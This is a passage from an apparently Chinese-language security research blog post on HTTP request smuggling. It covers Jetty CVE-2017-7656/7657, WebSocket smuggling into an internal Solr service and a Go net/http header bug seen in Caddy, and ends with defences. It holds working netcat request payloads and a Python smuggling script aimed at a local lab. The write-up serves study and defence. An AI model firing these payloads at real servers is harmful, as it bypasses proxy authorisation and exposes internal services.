## Jetty
Jetty 有三个与 HTTP Smuggling 相关的 CVE：
  * CVE-2017-7656 HTTP/0.9 issue
> ​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations),
> and 9.4.x (non-default configuration with RFC2616 compliance enabled),
> HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space
> URI space version) that declares a version of HTTP/0.9 was accepted and
> treated as a 0.9 request. If deployed behind an intermediary that also
> accepted and passed through the 0.9 version (but did not act on it), then
> the response sent could be interpreted by the intermediary as HTTP/1
> headers. This could be used to poison the cache if the server allowed the
> origin client to generate arbitrary content in the response.
  * CVE-2017-7657 Chunk size attribute truncation
> ​ In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations),
> and 9.4.x (non-default configuration with RFC2616 compliance enabled),
> transfer-encoding chunks are handled poorly. The chunk length parsing was
> vulnerable to an integer overflow. Thus a large chunk size could be
> interpreted as a smaller chunk size and content sent as chunk body could be
> interpreted as a pipelined request. If Jetty was deployed behind an
> intermediary that imposed some authorization and that intermediary allowed
> arbitrarily large chunks to be passed on unchanged, then this flaw could be
> used to bypass the authorization imposed by the intermediary as the fake
> pipelined request would not be interpreted by the intermediary as a request.
  * CVE-2017-7658 Double Content-Length
> ​ In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x
> configurations), and 9.4.x (all HTTP/1.x configurations), when presented
> with two content-lengths headers, Jetty ignored the second. When presented
> with a content-length and a chunked encoding header, the content-length was
> ignored (as per RFC 2616). If an intermediary decided on the shorter length,
> but still passed on the longer body, then body content could be interpreted
> by Jetty as a pipelined request. If the intermediary was imposing
> authorization, the fake pipelined request would bypass that authorization.
对于 CVE-2017-7658 我们就不再探究了，因为之前也提过了，我们主要来看另外两个比较有意思的地方。
### HTTP/0.9
环境依旧可以使用我构建的 [jetty lab 环境](https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty)，然后我们用如下方式发送一个标准的 HTTP/0.9 请求：
    printf 'GET /?test=4564\r\n'|nc -q 1 127.0.0.1 8994
得到一个 400 响应：
    HTTP/1.1 400 HTTP/0.9 not supported
    Content-Type: text/html;charset=iso-8859-1
    Content-Length: 65
    Connection: close
    Server: Jetty(9.4.9.v20180320)
    Bad Message 400reason: HTTP/0.9 not supported
接着我们加上版本标识：
    printf 'GET /?test=4564 HTTP/0.9\r\n\r\n'|nc -q 1 127.0.0.1 8994
虽然这是 HTTP/0.9 不支持的格式，但是也会有意外的收获，得到一个 200 响应：
    Sample "Hello, World" Application
    ...
这里的响应没有 headers ，只有 body ，也就是这个请求被 HTTP/0.9 进行了解析。
而且更有意思的是，添加上 HTTP/0.9 不支持的 headers 也会有意外的收获，这里我们添加一个提取响应包部分内容的 header：
    printf 'GET /?test=4564 HTTP/0.9\r\n'\
    'Range: bytes=36-42\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8994
    , World
会发现 body 内容被我们进行了提取，结合我们上文提到的结合 HTTP Versio 进行的 HTTP Response Splitting
，我们可以进行各种花式攻击
### Chunk size attribute truncation
我们利用以下代码发送请求：
    printf 'POST /?test=4973 HTTP/1.1\r\n'\
    'Transfer-Encoding: chunked\r\n'\
    'Content-Type: application/x-www-form-urlencoded\r\n'\
    'Host: localhost\r\n'\
    '\r\n'\
    '100000000\r\n'\
    '\r\n'\
    'POST /?test=4974 HTTP/1.1\r\n'\
    'Content-Length: 5\r\n'\
    'Host: localhost\r\n'\
    '\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8994|grep "HTTP/1.1"
然后我们可以得到两个 200 响应可是按照 chunk 的标准，虽然第二个部分看起来是一个请求，但是实际上应该被算在 chunk data
当中，而问题就在这，jetty 返回了两个请求，把 100000000 当作了 0 ，也就是 chunk end 部分，所以就出现了两个请求的原因。
我们可以再进行一些尝试：
    printf 'POST /?test=4975 HTTP/1.1\r\n'\
    'Transfer-Encoding: chunked\r\n'\
    'Content-Type: application/x-www-form-urlencoded\r\n'\
    'Host: localhost\r\n'\
    '\r\n'\
    '1ff00000008\r\n'\
    'abcdefgh\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    'POST /?test=4976 HTTP/1.1\r\n'\
    'Content-Length: 5\r\n'\
    'Host: localhost\r\n'\
    '\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    |nc -q 1 127.0.0.1 8994|grep "HTTP/1.1"
这里我们依然得到了两个 200 响应，也就是第一个 chunk size 1ff00000008 被 jetty 截断成了 8 ，也就是 chunk
data 部分只有`abcdefgh`，所以就返回了两个响应。
与 Apache CVE-2015-3183 类似，jetty 只会取 chunk size 的最后8个字节：
    ffffffffffff00000000\r\n
                ^^^^^^^^
                00000000 => size 0
    1ff00000008\r\n
       ^^^^^^^^
       00000008 => size 8
## Websocket
其实这部分完全可以作为一个独立的部分，但是感觉篇幅有点长了，这里就做一下简单的介绍，在 Hackactivity 2019 上，@0ang3el 提出了与
Websocket 相关的攻击技术 [What’s wrong with WebSocket APIs? Unveiling vulnerabilities
in WebSocket APIs.](https://www.slideshare.net/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis)，让我比较感兴趣的则是
Websocket Smuggling 的部分。
作者也把相关的描述放在了 [websocket-smuggle](https://github.com/0ang3el/websocket-smuggle)
这里，这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理`Sec-WebSocket-Version` 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行
Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。
这里我们假设内网存在 solr 服务，外网无法访问，如果存在 websocket smuggling ，我们可以编写以下代码访问 solr 服务：
    import socket 
    req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
    Host: ip:port
    Sec-WebSocket-Version: 1338
    Upgrade: websocket
    """.replace('\n', '\r\n')
    req2 = """GET /solr/#/ HTTP/1.1
    Host: localhost:8983
    """.replace('\n', '\r\n')
    def main(netloc):
        host, port = netloc.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))
        sock.sendall(req1)
        sock.recv(4096)
        sock.sendall(req2)
        # print req2
        data = sock.recv(4096)
        data = data.decode(errors = 'ignore')
        print(data)
        data = sock.recv(4096)
        data = data.decode(errors = 'ignore')
        print(data)
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    if __name__ == "__main__":
        main('ip:port')
在今年红帽杯上也有使用这个攻击技术的一道 CTF 赛题，相关的 writeup 可以看看 [Red Hat 2019 Web Write
Up](https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service)
## Golang
这个是比较有意思的一个部分，当时是在10月初 fuzz 的，然后也找了挺久的目标，最后停留在了之前同学推荐的一个中间件
[caddy](https://caddyserver.com/v1/) 上（现在是 11月 27 日，竟然出 caddy 2
了...），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境
[caddy](https://hub.docker.com/r/abiosoft/caddy)。
于是就有了：
当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE
给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go
某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。
当时可开心了，赶紧噼里啪啦搜索如何给 Golang 提 issue ，结果后来仔细弄了一会，发现这个问题在 9月27日已经被提到了 [net/http:
invalid headers are normalized, allowing request
smuggling](https://github.com/golang/go/issues/34540)，Golang 也在 1.13.1
版修复了该问题。//悔不当初应该提早看一看这方面的内容，错过一个 CVE /捂脸
然后我仔细看了本地 Golang 版本 1.8.x ...然后 Caddy 的 issue 邮件回复也到了...不出所料让我升级 Golang 到
1.13.1， ~~看了一眼 dockerhub 上的 caddy 我吐了~~
但是目前(11/27) dockerhub 上的 caddy 环境仍然还是有这个问题的，使用需谨慎！
## Something Else
hackerone 上已经有相关漏洞的披露了，这里推荐几篇挖洞实战的文章：
[Write up of two HTTP Requests Smuggling](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)
[HTTP Request Smuggling (CL.TE)](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
[HTTP Request Smuggling on vpn.lob.com](https://hackerone.com/reports/694604)
# Defence
> ​ 从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。
>
>   * 禁用代理服务器与后端服务器之间的TCP连接重用。
>   * 使用HTTP/2协议。
>   * 前后端使用相同的服务器。
>
>
>
> 以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。
然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过:
> Use HTTP/2 for back-end connections, as this protocol prevents ambiguity
> about the boundaries between requests.
之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over
a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP
连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。
具体可以参考 [HTTP/2
简介](\[https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5\]\(https://developers.google.com/web/fundamentals/performance/http2))
# Bonus
经过这段时间的学习研究，自己也将一些相关的实验整理成了 docker 环境，方便大家复现学习：[HTTP-Smuggling-Lab](https://github.com/ZeddYu/HTTP-Smuggling-Lab)
现在环境不多，欢迎 star，后面我会继续加入更多的环境方便大家以白盒的形式去理解学习， ~~如果我有时间的话~~
# References
[RFC7230](https://tools.ietf.org/html/rfc7230)
[HTTP Desync Attacks: Request Smuggling
Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
[HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
[regilero's blog](https://regilero.github.io/tag/Smuggling/)
[协议层的攻击——HTTP请求走私](https://paper.seebug.org/1048/)
[http request smuggling, cause by obfuscating TE
header](https://github.com/netty/netty/issues/9571)
[Multiple HTTP Smuggling reports](https://hackerone.com/reports/648434)
[HTTP/2: the difference between HTTP/1.1, benefits and how to use
it](https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b)